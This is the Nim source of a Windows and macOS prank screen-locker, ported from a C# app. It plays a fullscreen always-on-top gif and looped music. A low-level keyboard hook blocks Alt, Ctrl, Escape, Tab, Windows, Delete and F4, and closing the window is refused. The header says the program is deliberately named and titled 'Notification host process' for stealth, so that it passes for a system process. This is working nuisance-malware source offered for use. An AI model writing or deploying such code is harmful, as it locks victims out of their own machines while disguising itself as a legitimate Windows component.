# King Von anti-piracy screen - 1:1 Nim port of the C# WinForms app.
# Blocks escape-related hotkeys via a low-level keyboard hook, shows the
# King Von anti-piracy gif fullscreen, always-on-top, borderless, and plays
# the King Von music on loop. Built as a GUI-subsystem executable named
# "Notifications host process.exe" for stealth (task name disguise).

import std/[os]

const
  WH_KEYBOARD_LL   = 13
  WM_KEYDOWN       = 0x0100.uint32
  WM_SYSKEYDOWN    = 0x0104.uint32
  VK_LWIN    = 0x5B
  VK_RWIN    = 0x5C
  VK_TAB     = 0x09
  VK_ESCAPE  = 0x1B
  VK_F4      = 0x73
  VK_SHIFT   = 0x10
  VK_CONTROL = 0x11
  VK_ALT     = 0x12
  VK_DELETE  = 0x2E

  TIMER_ID = 1

  kingResource = staticRead("Resources/king.wav")
  vonResource  = staticRead("Resources/von.gif")

when defined(windows):
  import winim/lean
  import winim/inc/[gdiplus, mmsystem]

  var
    hookProc: HOOKPROC
    hookID: HHOOK = 0
    hwndMain: HWND = 0
    gdipToken: ULONG_PTR = 0
    gdipImage: ptr GpImage = nil
    frameDimTime: GUID = FrameDimensionTime
    frameCount: UINT = 1
    frameIndex: UINT = 0

  proc hookCallback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
    ## Low-level keyboard hook: block specific key presses (1:1 with C#).
    if nCode >= 0 and (wParam.uint32 == WM_KEYDOWN or wParam.uint32 == WM_SYSKEYDOWN):
      let vkCode = cast[ptr int32](lParam)[]
      case vkCode
      of VK_ALT, VK_F4, VK_ESCAPE, VK_CONTROL, VK_TAB, VK_SHIFT,
         VK_LWIN, VK_RWIN, VK_DELETE:
        return 1   # block the key press
      else: discard
    return CallNextHookEx(hookID, nCode, wParam, lParam)

  proc drawGif(hwnd: HWND) =
    let hdc = GetDC(hwnd)
    if hdc == 0: return
    var g: ptr GpGraphics
    discard GdipCreateFromHDC(hdc, addr g)
    var rc: RECT
    discard GetClientRect(hwnd, addr rc)
    discard GdipDrawImageRect(g, gdipImage, 0.0, 0.0,
                              (rc.right - rc.left).float32, (rc.bottom - rc.top).float32)
    discard GdipDeleteGraphics(g)
    discard ReleaseDC(hwnd, hdc)

  proc wndProc(hwnd: HWND, msg: UINT, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
    case msg
    of WM_TIMER:
      if gdipImage != nil and frameCount > 1:
        frameIndex = (frameIndex + 1) mod frameCount
        discard GdipImageSelectActiveFrame(gdipImage, addr frameDimTime, frameIndex)
        discard InvalidateRect(hwnd, nil, 1)
      return 0
    of WM_PAINT:
      var ps: PAINTSTRUCT
      let hdc = BeginPaint(hwnd, addr ps)
      discard hdc
      drawGif(hwnd)
      discard EndPaint(hwnd, addr ps)
      return 0
    of WM_ERASEBKGND:
      return 1
    of WM_SETCURSOR:
      discard SetCursor(LoadCursor(0, IDC_HELP))   # Cursors.Help, like C#
      return 1
    of WM_CLOSE:
      return 0   # block closing, like the stealth screen
    of WM_DESTROY:
      discard UnhookWindowsHookEx(hookID)
      discard mciSendStringW(L"close king", nil, 0, 0)
      PostQuitMessage(0)
      return 0
    else:
      return DefWindowProcW(hwnd, msg, wParam, lParam)

  proc setHook(): HHOOK =
    ## Install the low-level keyboard hook (1:1 with C# SetHook).
    hookProc = hookCallback
    let hMod = GetModuleHandleW(nil)
    result = SetWindowsHookExW(WH_KEYBOARD_LL, hookProc, hMod, 0)

  proc startMusic() =
    ## Extract embedded king.wav to temp and loop it (MusicPlayer port).
    var tmpKing = getTempDir() / "king.wav"
    try:
      writeFile(tmpKing, kingResource)
      discard mciSendStringW(L("open \"" & tmpKing & "\" type waveaudio alias king"), nil, 0, 0)
      discard mciSendStringW(L"setaudio king volume to 100", nil, 0, 0)  # ~10% like WMP volume=10
      discard mciSendStringW(L"play king repeat", nil, 0, 0)
    except IOError:
      echo "ERROR: I/O error!"

  proc loadGif() =
    var tmpVon = getTempDir() / "von.gif"
    try:
      writeFile(tmpVon, vonResource)
      if GdipLoadImageFromFile(L(tmpVon), addr gdipImage) != Ok:
        echo "ERROR: could not load gif!"
        return
      discard GdipImageForceValidation(gdipImage)
      discard GdipImageGetFrameCount(gdipImage, addr frameDimTime, addr frameCount)
    except IOError:
      echo "ERROR: I/O error!"

  proc run() =
    # 1:1 with Program.Main: GUI app, no console.
    var gdipStartupInput: GdiplusStartupInput
    gdipStartupInput.GdiplusVersion = 1
    discard GdiplusStartup(addr gdipToken, addr gdipStartupInput, nil)

    loadGif()
    startMusic()

    let hInst = GetModuleHandleW(nil)
    var wc: WNDCLASSEXW
    wc.cbSize = sizeof(wc).UINT
    wc.style = CS_HREDRAW or CS_VREDRAW
    wc.lpfnWndProc = wndProc
    wc.hInstance = hInst
    wc.lpszClassName = L"NotificationHostProcess"
    discard RegisterClassExW(addr wc)

    # Borderless (FormBorderStyle.None), no control box (ControlBox=false is
    # handled via WS_POPUP), not in taskbar (WS_EX_TOOLWINDOW), topmost,
    # title "Notification host process", maximized, centered start position.
    let style = DWORD(WS_POPUP or WS_VISIBLE or WS_MAXIMIZE)
    let exStyle = DWORD(WS_EX_TOPMOST or WS_EX_TOOLWINDOW or WS_EX_WINDOWEDGE)
    hwndMain = CreateWindowExW(exStyle, L"NotificationHostProcess",
                                L"Notification host process",
                                style, CW_USEDEFAULT, CW_USEDEFAULT,
                                GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                                0, 0, hInst, nil)
    ShowWindow(hwndMain, SW_SHOWMAXIMIZED)
    UpdateWindow(hwndMain)

    # Keyboard hook installed before message loop, as in C# constructor.
    hookID = setHook()

    # ~10fps frame advance for the animated gif (Windows Forms PictureBox
    # renders gif animation natively; GDI+ needs manual frame selection).
    discard SetTimer(hwndMain, TIMER_ID, 100, nil)

    var msg: MSG
    while GetMessageW(addr msg, 0, 0, 0) != 0:
      TranslateMessage(addr msg)
      DispatchMessageW(addr msg)

    if hookID != 0:
      discard UnhookWindowsHookEx(hookID)
    GdiplusShutdown(gdipToken)

elif defined(macosx):
  {.compile: "kingvon_mac.m".}
  {.passL: "-framework AppKit -framework Carbon -framework Foundation".}
  {.passC: "-x objective-c".}
  proc RunMacApp(gifPath, wavPath: cstring) {.importc.}

  proc run() =
    # Extract embedded resources to temp, same as the Windows build.
    let tmpKing = getTempDir() / "king.wav"
    let tmpVon = getTempDir() / "von.gif"
    try:
      writeFile(tmpKing, kingResource)
      writeFile(tmpVon, vonResource)
    except IOError:
      echo "ERROR: I/O error!"
      return
    RunMacApp(tmpVon.cstring, tmpKing.cstring)

else:
  {.error: "Only Windows and macOS are supported.".}

run()
